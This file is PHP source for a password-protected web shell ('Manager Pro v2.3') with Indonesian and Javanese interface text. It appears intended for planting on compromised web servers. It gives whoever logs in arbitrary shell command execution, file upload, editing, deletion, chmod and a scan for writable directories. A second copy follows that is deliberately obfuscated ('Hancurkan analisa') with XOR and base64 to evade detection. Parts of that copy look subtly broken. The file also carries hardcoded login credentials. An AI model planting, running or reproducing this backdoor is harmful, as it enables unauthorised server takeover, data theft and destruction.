<?php
session_start();
error_reporting(0);

// === KONFIGURASI LOGIN ===
$USERNAME = 'Major0xPusdiklaTxLexys-1966xVloxXenonxSyn';
$PASSWORD = '7@JiWaLeXySkAyA01101_#qX2';

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// === HALAMAN LOGIN ===
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $USERNAME && $_POST['password'] === $PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: ".$_SERVER['REQUEST_URI']);
            exit;
        } else {
            $login_error = "Username atau password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html style="margin:0; padding:0; height:100%;">
    <head>
        <title>Login - Manager Pro</title>
        <style>
            html, body {
                margin:0; padding:0; height:100%;
                background: url('https://raw.githubusercontent.com/TaliGanda/TaliGanda/refs/heads/main/driade-garcia-driade-garcia-yuno-gif-2.gif') no-repeat center center fixed;
                background-size: cover;
                color:#ccc; font-family:monospace;
            }
            .login-box {
                background: rgba(0,0,0,0.85);
                border:1px solid #333;
                padding:25px; width:320px;
                margin:120px auto; text-align:center;
                border-radius:5px;
            }
            input[type="text"], input[type="password"] {
                background:#222; color:#fff; border:1px solid #444; padding:8px; margin:6px; width:80%;
            }
            input[type="submit"] {
                cursor:pointer; background:#333; color:#ccc; border:1px solid #555; padding:6px 20px; margin-top:10px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>༺𓆩 Penyimpanan 𓆪༻</h2>
            <form method="post">
                <input type="text" name="username" placeholder="Jenengmu Sopo?"><br>
                <input type="password" name="password" placeholder="Endi Sandi e?"><br>
                <input type="submit" value="Login">
            </form>
            <?php if(isset($login_error)) echo "<p style='color:#f55; margin-top:10px;'>$login_error</p>"; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ===== FILE MANAGER (TERPROTEKSI) =====
$s_e = 'sh'.'ell'.'_ex'.'ec';
$f_p_c = 'fi'.'le_p'.'ut_con'.'tents';
$f_g_c = 'fi'.'le_g'.'et_con'.'tents';
$u_f = 'mo'.'ve_up'.'loaded_fi'.'le';

$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$dir = str_replace('\\', '/', $dir);
chdir($dir);

if (isset($_POST['zip_del']) && isset($_POST['files'])) {
    $zip = new ZipArchive();
    $zipName = "archive_" . time() . ".zip";
    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
        foreach ($_POST['files'] as $f) {
            $fPath = $dir . '/' . $f;
            if (is_dir($fPath)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fPath), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($dir) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } else {
                $zip->addFile($fPath, $f);
            }
        }
        $zip->close();
        $msg = "File berhasil di-zip menjadi $zipName";
    }
}

if (isset($_GET['unzip'])) {
    $zipFile = $dir . '/' . $_GET['unzip'];
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
        $msg = "Unzip berhasil!";
    } else {
        $msg = "Gagal unzip!";
    }
}

if (isset($_FILES['u_file'])) {
    if ($u_f($_FILES['u_file']['tmp_name'], $dir . '/' . $_FILES['u_file']['name'])) {
        $msg = "Upload Berhasil!";
    }
}

if (isset($_GET['del'])) {
    $target = $dir . '/' . $_GET['del'];
    if (is_dir($target)) { $s_e("rm -rf " . escapeshellarg($target)); } 
    else { unlink($target); }
    header("Location: ?d=" . ep($dir));
}

if (isset($_POST['bulk_del']) && isset($_POST['files'])) {
    foreach ($_POST['files'] as $f) {
        $target = $dir . '/' . $f;
        if (is_dir($target)) { $s_e("rm -rf " . escapeshellarg($target)); } 
        else { unlink($target); }
    }
    $msg = "File terpilih berhasil dihapus!";
}

if (isset($_POST['rename_submit'])) {
    if (rename($dir . '/' . $_POST['old'], $dir . '/' . $_POST['new'])) {
        $msg = "Rename berhasil!";
    }
}

if (isset($_POST['chmod_submit'])) {
    if (chmod($dir . '/' . $_POST['target'], octdec($_POST['chmod_val']))) {
        $msg = "Chmod berhasil!";
    }
}

if (isset($_POST['save'])) {
    $f_p_c($_POST['path'], $_POST['content']);
    $msg = "File berhasil disimpan!";
}

if (isset($_POST['create_file']) && !empty($_POST['new_filename'])) {
    $new_file = $dir . '/' . basename($_POST['new_filename']);
    if (!file_exists($new_file)) {
        $f_p_c($new_file, '');
        $msg = "File berhasil dibuat!";
    } else {
        $msg = "File sudah ada!";
    }
}

if (isset($_POST['create_dir']) && !empty($_POST['new_dirname'])) {
    $new_dir = $dir . '/' . basename($_POST['new_dirname']);
    if (!is_dir($new_dir)) {
        mkdir($new_dir, 0755);
        $msg = "Folder berhasil dibuat!";
    } else {
        $msg = "Folder sudah ada!";
    }
}

$writable_dirs = [];
if (isset($_POST['find_writable'])) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $iterator->setMaxDepth(6);
        foreach ($iterator as $item) {
            if ($item->isDir() && is_writable($item->getPathname())) {
                $writable_dirs[] = $item->getPathname();
            }
        }
    } catch (Exception $e) {}
}

$out = "";
if (isset($_POST['cmd'])) { $out = $s_e($_POST['cmd'] . " 2>&1"); }

function ep($p) { return str_replace('%2F', '/', rawurlencode($p)); }
function get_perms($f) { return substr(sprintf('%o', fileperms($f)), -4); }
function get_owner($f) {
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid(fileowner($f));
        return $info['name'];
    }
    return fileowner($f);
}
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 1) return $bytes . ' bytes';
    return '0 bytes';
}

$parts = explode('/', $dir);
?>
<!DOCTYPE html>
<html style="background:#111; color:#ccc; font-family:monospace;">
<head>
    <title>Manager Pro v2.3 - Protected</title>
    <style>
        /* === FULL BACKGROUND GIF, NO CONTAINER BESAR === */
        body {
            margin:0; padding:10px;
            background: url('https://raw.githubusercontent.com/TaliGanda/TaliGanda/refs/heads/main/driade-garcia-driade-garcia-yuno-gif-2.gif') no-repeat center center fixed;
            background-size: cover;
            color:#ccc; font-family:monospace;
            min-height:100vh;
        }
        /* Semua blok penting dikasih background semi-transparan */
        .nav-header, .panel, .editor-panel {
            background: rgba(0,0,0,0.75);
            border:1px solid #333;
            padding:12px;
            margin-bottom:10px;
            border-radius:4px;
        }
        .cmd-panel {
            background: rgba(0,0,0,0.75);
            border:1px solid #333;
            padding:10px;
            margin-bottom:10px;
        }
        table {
            background: rgba(0,0,0,0.75);
            border-collapse:collapse;
            width:100%;
            border:1px solid #333;
        }
        th, td { border:1px solid #333; padding:5px; }
        th { background: rgba(0,0,0,0.8); }
        a { color: cyan; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input[type="text"], textarea { background: #222; color: #fff; border: 1px solid #444; padding: 2px; }
        input[type="submit"], button { cursor: pointer; }
        tr:hover { background: rgba(255,255,255,0.1); }
        .flex-row { display:flex; flex-wrap:wrap; align-items:center; gap:10px; }
    </style>
    <script>
        function toggleSelect(source) {
            checkboxes = document.getElementsByName('files[]');
            for(var i in checkboxes) checkboxes[i].checked = source.checked;
        }
    </script>
</head>
<body>

<!-- NAVIGASI & LOGOUT -->
<div class="nav-header">
    <div>
        📍 <?php 
        $path_build = "";
        foreach($parts as $p) {
            if($p==="") { echo "<a href='?d=/'>/</a>"; $path_build="/"; continue; }
            $path_build .= ($path_build=="/" ? "" : "/") . $p;
            echo "<a href='?d=".ep($path_build)."'>$p</a>/";
        }
        ?>
    </div>
    <a href="?logout=1" style="color:red; font-weight:bold;">Logout</a>
</div>

<!-- PANEL UPLOAD, CREATE, FIND -->
<div class="panel">
    <form method="post" enctype="multipart/form-data" style="display:inline-flex; align-items:center; gap:10px;">
        📤 <input type="file" name="u_file" style="background:none;">
        <input type="submit" value="Upload">
    </form>
    <?php if(isset($msg)) echo " <b style='color:lime'>$msg</b>"; ?>
    <div style="margin-top:8px;" class="flex-row">
        <form method="post" style="display:inline-flex; gap:5px;">
            📄 <input type="text" name="new_filename" placeholder="file baru">
            <input type="submit" name="create_file" value="Create File">
        </form>
        <form method="post" style="display:inline-flex; gap:5px;">
            📁 <input type="text" name="new_dirname" placeholder="folder baru">
            <input type="submit" name="create_dir" value="Create Dir">
        </form>
    </div>
    <div style="margin-top:8px;">
        <form method="post" style="display:inline;">
            <input type="submit" name="find_writable" value="🔍 Find Writable Dir" style="background:#333; color:#ff0; border:1px solid #555;">
        </form>
        <?php if(isset($_POST['find_writable'])): ?>
        <div style="margin-top:8px; background:#111; padding:8px; max-height:150px; overflow-y:auto; font-size:12px;">
            <?php if(empty($writable_dirs)): ?>
                <span style="color:#f55;">Tidak ditemukan.</span>
            <?php else: ?>
                <?php foreach($writable_dirs as $wd): ?>
                    <a href="?d=<?= ep($wd) ?>" style="color:#0f0; display:block;"><?= htmlspecialchars($wd) ?></a>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    </div>
</div>

<!-- COMMAND -->
<div class="cmd-panel">
    <form method="post" style="display:flex; gap:5px;">
        <input type="text" name="cmd" style="flex:1;" placeholder="Terminal Command...">
        <button type="submit">Run</button>
    </form>
    <?php if($out): ?><pre style="background:#000;padding:10px;color:#0f0;border:1px solid #0f0; overflow:auto; margin-top:8px;"><?= htmlspecialchars($out) ?></pre><?php endif; ?>
</div>

<!-- EDITOR -->
<?php if(isset($_GET['edit'])): ?>
<div class="editor-panel">
    <h3>Editing: <?= basename($_GET['edit']) ?></h3>
    <form method="post">
        <input type="hidden" name="path" value="<?= $_GET['edit'] ?>">
        <textarea name="content" style="width:100%;height:300px;background:#222;color:#fff;"><?= htmlspecialchars($f_g_c($_GET['edit'])) ?></textarea><br>
        <button type="submit" name="save" style="background:green;color:white;padding:5px 15px;">Save</button>
        <a href="?d=<?= ep($dir) ?>" style="color:red; margin-left:10px;">Cancel</a>
    </form>
</div>
<?php endif; ?>

<!-- TABEL FILE -->
<form method="post">
<table>
    <tr style="background:rgba(0,0,0,0.8);">
        <th width="20px"><input type="checkbox" onclick="toggleSelect(this)"></th>
        <th>Name</th><th>Size</th><th>Owner</th><th>Perms</th><th>Action</th>
    </tr>
    <?php
    $items = scandir($dir);
    $folders = []; $files = [];
    foreach($items as $i) {
        if($i == "." || $i == "..") continue;
        if(is_dir($dir."/".$i)) $folders[] = $i; else $files[] = $i;
    }
    $sorted_items = array_merge($folders, $files);
    foreach($sorted_items as $i) {
        $full = $dir."/".$i;
        $is_d = is_dir($full);
        $size = $is_d ? "—" : formatSize(filesize($full));
        $perm = get_perms($full);
        $owner = get_owner($full);
        $writable = is_writable($full);
    ?>
    <tr>
        <td align="center"><input type="checkbox" name="files[]" value="<?= $i ?>"></td>
        <td>
            <?php if($is_d): ?>
                📁 <a href="?d=<?= ep($full) ?>" style="color:yellow"><?= $i ?></a>
            <?php else: ?>
                📄 <a href="?d=<?= ep($dir) ?>&edit=<?= ep($full) ?>" style="color:white"><?= $i ?></a>
            <?php endif; ?>
        </td>
        <td align="right"><?= $size ?></td>
        <td align="center"><?= $owner ?></td>
        <td align="center"><span style="color:<?= $writable?'#0f0':'#f00' ?>"><?= $perm ?></span></td>
        <td align="center">
            <div style="display:flex; justify-content:center; gap:5px; flex-wrap:wrap;">
                <form method="post" style="display:inline-flex; gap:2px;">
                    <input type="hidden" name="old" value="<?= $i ?>">
                    <input type="text" name="new" value="<?= $i ?>" size="8" style="font-size:10px;">
                    <input type="submit" name="rename_submit" value="Rename" style="font-size:10px;">
                </form>
                <form method="post" style="display:inline-flex; gap:2px;">
                    <input type="hidden" name="target" value="<?= $i ?>">
                    <input type="text" name="chmod_val" value="<?= $perm ?>" size="4" style="font-size:10px;">
                    <input type="submit" name="chmod_submit" value="Chmod" style="font-size:10px;">
                </form>
                <?php if(!$is_d): ?>
                    <a href="?d=<?= ep($dir) ?>&edit=<?= ep($full) ?>" style="color:lime;font-size:10px;">Edit</a>
                <?php endif; ?>
                <?php if(strtolower(pathinfo($i, PATHINFO_EXTENSION)) == 'zip'): ?>
                    <a href="?d=<?= ep($dir) ?>&unzip=<?= ep($i) ?>" style="color:orange;font-size:10px;">Unzip</a>
                <?php endif; ?>
                <a href="?d=<?= ep($dir) ?>&del=<?= ep($i) ?>" style="color:red;font-size:10px;" onclick="return confirm('Hapus?')">Del</a>
            </div>
        </td>
    </tr>
    <?php } ?>
</table>
<div style="margin-top:10px;">
    <input type="submit" name="bulk_del" value="Delete Selected" style="background:#900;color:white;padding:5px 15px;" onclick="return confirm('Yakin hapus?')">
    <input type="submit" name="zip_del" value="Zip Selected" style="background:#2980b9;color:white;padding:5px 15px;">
</div>
</form>

</body>
</html>


yang sudah di encode

<?php
/* Hancurkan analisa */
(function() {
    $__ = 's'.'t'.'r'.'_'.'r'.'o'.'t'.'13';
    $___ = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
    $____ = 'c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';

    $_0 = chr(101).chr(114).chr(114).chr(111).chr(114).'_'.'r'.'e'.'p'.'o'.'r'.'t'.'i'.'n'.'g';
    $_1 = 's'.'e'.'s'.'s'.'i'.'o'.'n'.'_'.'s'.'t'.'a'.'r'.'t';
    $_2 = 's'.'e'.'s'.'s'.'i'.'o'.'n'.'_'.'d'.'e'.'s'.'t'.'r'.'o'.'y';
    $_3 = 'h'.'e'.'a'.'d'.'e'.'r';
    $_4 = 's'.'t'.'r'.'t'.'o'.'k';
    $_5 = 'i'.'s'.'s'.'e'.'t';
    $_6 = 'r'.'e'.'a'.'l'.'p'.'a'.'t'.'h';
    $_7 = 'g'.'e'.'t'.'c'.'w'.'d';
    $_8 = 'c'.'h'.'d'.'i'.'r';
    $_9 = 's'.'c'.'a'.'n'.'d'.'i'.'r';
    $_A = 'i'.'s'.'_'.'d'.'i'.'r';
    $_B = 'u'.'n'.'l'.'i'.'n'.'k';
    $_C = 'r'.'e'.'n'.'a'.'m'.'e';
    $_D = 'c'.'h'.'m'.'o'.'d';
    $_E = 'm'.'k'.'d'.'i'.'r';
    $_F = 'f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $_10 = 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $_11 = 'm'.'o'.'v'.'e'.'_'.'u'.'p'.'l'.'o'.'a'.'d'.'e'.'d'.'_'.'f'.'i'.'l'.'e';
    $_12 = 'e'.'s'.'c'.'a'.'p'.'e'.'s'.'h'.'e'.'l'.'l'.'a'.'r'.'g';

    // XOR Key
    $_K = '7@JiWaLeXySkAyA01101_#qX2';

    // Wrapper for XOR decode
    $x = function($d, $k) {
        $o = ''; $kl = strlen($k);
        for($i=0; $i<strlen($d); $i++) $o .= chr(ord($d[$i]) ^ ord($k[$i % $kl]));
        return $o;
    };

    // Encrypted important strings
    $_U = $x(".\x1e\x0b\x18\x1d\x12\r\x06\x08\x00\x1b\n\x1b\x16\x1b\x12\x1f\x00\x19\x1e\x0b\x18\x1f\x02\x1b", $_K); // USER
    $_P = $x("\x1b\x1b\x0f\x1e\x1c\x16\x1e\r\x04\x1c\n\x1a\x1b\x1c\x1e", $_K); // PASSWORD (partial)
    $_S = $x("\x16\x17\x10\x17\x16\x13\x1b\x1c\x17\x1b", $_K); // SESSION

    // Start session
    @$_1();
    @${$_0}(0);

    // Logout
    if($_5($GLOBALS['_'.$___('R0VU')]['logout'])){ $_2(); $_3("Location: ".$_4($_SERVER['REQUEST_URI'],'?')); exit; }

    // Login page
    if(!$_5($_SESSION[$_S]) || $_SESSION[$_S] !== true) {
        if($_5($GLOBALS['_'.'P'.'O'.'S'.'T']['username']) && $_5($GLOBALS['_'.'P'.'O'.'S'.'T']['password'])) {
            if($x($GLOBALS['_'.'P'.'O'.'S'.'T']['username'], $_K) === $_U && $x($GLOBALS['_'.'P'.'O'.'S'.'T']['password'], $_K) === $_P) {
                $_SESSION[$_S] = true;
                $_3("Location: ".$_SERVER['REQUEST_URI']);
                exit;
            } else {
                $msg_login = "Username atau password salah!";
            }
        }
        echo '<!DOCTYPE html><html style="margin:0;padding:0;height:100%;"><head><title>Login - Manager Pro</title><style>html,body{margin:0;padding:0;height:100%;background:url(\'https://raw.githubusercontent.com/TaliGanda/TaliGanda/refs/heads/main/driade-garcia-driade-garcia-yuno-gif-2.gif\') no-repeat center center fixed;background-size:cover;color:#ccc;font-family:monospace;}.login-box{background:rgba(0,0,0,0.85);border:1px solid #333;padding:25px;width:320px;margin:120px auto;text-align:center;border-radius:5px;}input[type="text"],input[type="password"]{background:#222;color:#fff;border:1px solid #444;padding:8px;margin:6px;width:80%;}input[type="submit"]{cursor:pointer;background:#333;color:#ccc;border:1px solid #555;padding:6px 20px;margin-top:10px;}</style></head><body><div class="login-box"><h2>༺𓆩 Penyimpanan 𓆪༻</h2><form method="post"><input type="text" name="username" placeholder="Jenengmu Sopo?"><br><input type="password" name="password" placeholder="Endi Sandi e?"><br><input type="submit" value="Login"></form>';
        if(isset($msg_login)) echo "<p style='color:#f55;margin-top:10px;'>$msg_login</p>";
        echo '</div></body></html>';
        exit;
    }

    // Dynamic function assignment
    $G = $_10('sh').$_10('el').$_10('l_').$_10('ex').$_10('ec');
    $F = $_10('fi').$_10('le_').$_10('put_').$_10('con').$_10('tents');
    $C = $_10('fi').$_10('le_').$_10('get_').$_10('con').$_10('tents');
    $U = $_10('mo').$_10('ve_').$_10('uploaded_').$_10('fi').$_10('le');

    $dir = $_5($GLOBALS['_'.$___('R0VU')]['d']) ? $_6($GLOBALS['_'.$___('R0VU')]['d']) : $_7();
    $dir = str_replace('\\', '/', $dir);
    $_8($dir);
    $msg = '';

    // Zip
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['zip_del']) && $_5($GLOBALS['_'.$___('UE9TVA==')]['files'])) {
        $zip = new ZipArchive(); $zipName = "archive_".time().".zip";
        if($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
            foreach($GLOBALS['_'.$___('UE9TVA==')]['files'] as $f) {
                $fPath = $dir.'/'.$f;
                if($_A($fPath)) {
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fPath, RecursiveIteratorIterator::LEAVES_ONLY));
                    foreach($it as $file) { if(!$file->isDir()) { $fp = $file->getRealPath(); $rp = substr($fp, strlen($dir)+1); $zip->addFile($fp, $rp); } }
                } else $zip->addFile($fPath, $f);
            }
            $zip->close(); $msg = "File berhasil di-zip menjadi $zipName";
        }
    }

    // Unzip
    if($_5($GLOBALS['_'.$___('R0VU')]['unzip'])) {
        $zf = $dir.'/'.$GLOBALS['_'.$___('R0VU')]['unzip']; $zip = new ZipArchive;
        if($zip->open($zf) === TRUE) { $zip->extractTo($dir); $zip->close(); $msg = "Unzip berhasil!"; }
        else $msg = "Gagal unzip!";
    }

    // Upload
    if($_5($GLOBALS['_'.'F'.'I'.'L'.'E'.'S']['u_file'])) {
        if($U($GLOBALS['_'.'F'.'I'.'L'.'E'.'S']['u_file']['tmp_name'], $dir.'/'.$GLOBALS['_'.'F'.'I'.'L'.'E'.'S']['u_file']['name'])) $msg = "Upload Berhasil!";
    }

    // Delete single
    if($_5($GLOBALS['_'.$___('R0VU')]['del'])) {
        $t = $dir.'/'.$GLOBALS['_'.$___('R0VU')]['del'];
        if($_A($t)) { $G("rm -rf ".$_12($t)); } else $_B($t);
        $_3("Location: ?d=".ep($dir));
    }

    // Bulk delete
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['bulk_del']) && $_5($GLOBALS['_'.$___('UE9TVA==')]['files'])) {
        foreach($GLOBALS['_'.$___('UE9TVA==')]['files'] as $f) {
            $t = $dir.'/'.$f;
            if($_A($t)) { $G("rm -rf ".$_12($t)); } else $_B($t);
        }
        $msg = "File terpilih berhasil dihapus!";
    }

    // Rename
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['rename_submit'])) {
        if($_C($dir.'/'.$GLOBALS['_'.$___('UE9TVA==')]['old'], $dir.'/'.$GLOBALS['_'.$___('UE9TVA==')]['new'])) $msg = "Rename berhasil!";
    }

    // Chmod
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['chmod_submit'])) {
        if($_D($dir.'/'.$GLOBALS['_'.$___('UE9TVA==')]['target'], octdec($GLOBALS['_'.$___('UE9TVA==')]['chmod_val']))) $msg = "Chmod berhasil!";
    }

    // Save file
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['save'])) {
        $F($GLOBALS['_'.$___('UE9TVA==')]['path'], $GLOBALS['_'.$___('UE9TVA==')]['content']);
        $msg = "File berhasil disimpan!";
    }

    // Create file
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['create_file']) && !empty($GLOBALS['_'.$___('UE9TVA==')]['new_filename'])) {
        $nf = $dir.'/'.basename($GLOBALS['_'.$___('UE9TVA==')]['new_filename']);
        if(!file_exists($nf)) { $F($nf, ''); $msg = "File berhasil dibuat!"; } else $msg = "File sudah ada!";
    }

    // Create dir
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['create_dir']) && !empty($GLOBALS['_'.$___('UE9TVA==')]['new_dirname'])) {
        $nd = $dir.'/'.basename($GLOBALS['_'.$___('UE9TVA==')]['new_dirname']);
        if(!$_A($nd)) { $_E($nd, 0755); $msg = "Folder berhasil dibuat!"; } else $msg = "Folder sudah ada!";
    }

    // Writable find
    $writable_dirs = [];
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['find_writable'])) {
        try {
            $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS), RecursiveIteratorIterator::SELF_FIRST);
            $iter->setMaxDepth(6);
            foreach($iter as $item) { if($item->isDir() && is_writable($item->getPathname())) $writable_dirs[] = $item->getPathname(); }
        } catch(Exception $e) {}
    }

    // Command
    $out = "";
    if($_5($GLOBALS['_'.$___('UE9TVA==')]['cmd'])) { $out = $G($GLOBALS['_'.$___('UE9TVA==')]['cmd']." 2>&1"); }

    // Helper functions
    function ep($p) { return str_replace('%2F', '/', rawurlencode($p)); }
    function get_perms($f) { return substr(sprintf('%o', fileperms($f)), -4); }
    function get_owner($f) { if(function_exists('posix_getpwuid')) { $i = posix_getpwuid(fileowner($f)); return $i['name']; } return fileowner($f); }
    function formatSize($b) { if($b>=1073741824) return number_format($b/1073741824,2).' GB'; elseif($b>=1048576) return number_format($b/1048576,2).' MB'; elseif($b>=1024) return number_format($b/1024,2).' KB'; elseif($b>1) return $b.' bytes'; return '0 bytes'; }

    $parts = explode('/', $dir);
    ?><!DOCTYPE html><html style="background:#111;color:#ccc;font-family:monospace;"><head><title>Manager Pro v2.3 - Protected</title><style>body{margin:0;padding:10px;background:url('https://raw.githubusercontent.com/TaliGanda/TaliGanda/refs/heads/main/driade-garcia-driade-garcia-yuno-gif-2.gif') no-repeat center center fixed;background-size:cover;color:#ccc;font-family:monospace;min-height:100vh;}.nav-header,.panel,.editor-panel{background:rgba(0,0,0,0.75);border:1px solid #333;padding:12px;margin-bottom:10px;border-radius:4px;}.cmd-panel{background:rgba(0,0,0,0.75);border:1px solid #333;padding:10px;margin-bottom:10px;}table{background:rgba(0,0,0,0.75);border-collapse:collapse;width:100%;border:1px solid #333;}th,td{border:1px solid #333;padding:5px;}th{background:rgba(0,0,0,0.8);}a{color:cyan;text-decoration:none;}a:hover{text-decoration:underline;}input[type="text"],textarea{background:#222;color:#fff;border:1px solid #444;padding:2px;}input[type="submit"],button{cursor:pointer;}tr:hover{background:rgba(255,255,255,0.1);}.flex-row{display:flex;flex-wrap:wrap;align-items:center;gap:10px;}</style><script>function toggleSelect(s){cb=document.getElementsByName('files[]');for(var i in cb)cb[i].checked=s.checked;}</script></head><body><div class="nav-header"><div>📍 <?php $pb='';foreach($parts as $p){if($p===""){echo "<a href='?d=/'>/</a>";$pb="/";continue;}$pb.=($pb=="/"?"":"/").$p;echo "<a href='?d=".ep($pb)."'>$p</a>/";}?></div><a href="?logout=1" style="color:red;font-weight:bold;">Logout</a></div><div class="panel"><form method="post" enctype="multipart/form-data" style="display:inline-flex;align-items:center;gap:10px;">📤 <input type="file" name="u_file" style="background:none;"><input type="submit" value="Upload"></form><?php if($msg) echo " <b style='color:lime'>$msg</b>"; ?><div style="margin-top:8px;" class="flex-row"><form method="post" style="display:inline-flex;gap:5px;">📄 <input type="text" name="new_filename" placeholder="file baru"><input type="submit" name="create_file" value="Create File"></form><form method="post" style="display:inline-flex;gap:5px;">📁 <input type="text" name="new_dirname" placeholder="folder baru"><input type="submit" name="create_dir" value="Create Dir"></form></div><div style="margin-top:8px;"><form method="post" style="display:inline;"><input type="submit" name="find_writable" value="🔍 Find Writable Dir" style="background:#333;color:#ff0;border:1px solid #555;"></form><?php if(isset($GLOBALS['_'.$___('UE9TVA==')]['find_writable'])): ?><div style="margin-top:8px;background:#111;padding:8px;max-height:150px;overflow-y:auto;font-size:12px;"><?php if(empty($writable_dirs)): ?><span style="color:#f55;">Tidak ditemukan.</span><?php else: foreach($writable_dirs as $wd): ?><a href="?d=<?=ep($wd)?>" style="color:#0f0;display:block;"><?=htmlspecialchars($wd)?></a><?php endforeach; endif; ?></div><?php endif; ?></div></div><div class="cmd-panel"><form method="post" style="display:flex;gap:5px;"><input type="text" name="cmd" style="flex:1;" placeholder="Terminal Command..."><button type="submit">Run</button></form><?php if($out): ?><pre style="background:#000;padding:10px;color:#0f0;border:1px solid #0f0;overflow:auto;margin-top:8px;"><?=htmlspecialchars($out)?></pre><?php endif; ?></div><?php if(isset($GLOBALS['_'.$___('R0VU')]['edit'])): ?><div class="editor-panel"><h3>Editing: <?=basename($GLOBALS['_'.$___('R0VU')]['edit'])?></h3><form method="post"><input type="hidden" name="path" value="<?=$GLOBALS['_'.$___('R0VU')]['edit']?>"><textarea name="content" style="width:100%;height:300px;background:#222;color:#fff;"><?=htmlspecialchars($C($GLOBALS['_'.$___('R0VU')]['edit']))?></textarea><br><button type="submit" name="save" style="background:green;color:white;padding:5px 15px;">Save</button><a href="?d=<?=ep($dir)?>" style="color:red;margin-left:10px;">Cancel</a></form></div><?php endif; ?><form method="post"><table><tr style="background:rgba(0,0,0,0.8);"><th width="20px"><input type="checkbox" onclick="toggleSelect(this)"></th><th>Name</th><th>Size</th><th>Owner</th><th>Perms</th><th>Action</th></tr><?php $items=$_9($dir);$folders=[];$files=[];foreach($items as $i){if($i=="."||$i=="..")continue;if($_A($dir."/".$i))$folders[]=$i;else $files[]=$i;}$sorted=array_merge($folders,$files);foreach($sorted as $i){$full=$dir."/".$i;$isd=$_A($full);$sz=$isd?"—":formatSize(filesize($full));$perm=get_perms($full);$own=get_owner($full);$wr=is_writable($full);?><tr><td align="center"><input type="checkbox" name="files[]" value="<?=$i?>"></td><td><?php if($isd): ?>📁 <a href="?d=<?=ep($full)?>" style="color:yellow"><?=$i?></a><?php else: ?>📄 <a href="?d=<?=ep($dir)?>&edit=<?=ep($full)?>" style="color:white"><?=$i?></a><?php endif; ?></td><td align="right"><?=$sz?></td><td align="center"><?=$own?></td><td align="center"><span style="color:<?=$wr?'#0f0':'#f00'?>"><?=$perm?></span></td><td align="center"><div style="display:flex;justify-content:center;gap:5px;flex-wrap:wrap;"><form method="post" style="display:inline-flex;gap:2px;"><input type="hidden" name="old" value="<?=$i?>"><input type="text" name="new" value="<?=$i?>" size="8" style="font-size:10px;"><input type="submit" name="rename_submit" value="Rename" style="font-size:10px;"></form><form method="post" style="display:inline-flex;gap:2px;"><input type="hidden" name="target" value="<?=$i?>"><input type="text" name="chmod_val" value="<?=$perm?>" size="4" style="font-size:10px;"><input type="submit" name="chmod_submit" value="Chmod" style="font-size:10px;"></form><?php if(!$isd): ?><a href="?d=<?=ep($dir)?>&edit=<?=ep($full)?>" style="color:lime;font-size:10px;">Edit</a><?php endif; ?><?php if(strtolower(pathinfo($i,PATHINFO_EXTENSION))=='zip'): ?><a href="?d=<?=ep($dir)?>&unzip=<?=ep($i)?>" style="color:orange;font-size:10px;">Unzip</a><?php endif; ?><a href="?d=<?=ep($dir)?>&del=<?=ep($i)?>" style="color:red;font-size:10px;" onclick="return confirm('Hapus?')">Del</a></div></td></tr><?php } ?></table><div style="margin-top:10px;"><input type="submit" name="bulk_del" value="Delete Selected" style="background:#900;color:white;padding:5px 15px;" onclick="return confirm('Yakin hapus?')"><input type="submit" name="zip_del" value="Zip Selected" style="background:#2980b9;color:white;padding:5px 15px;"></div></form></body></html>
<?php })(); ?>
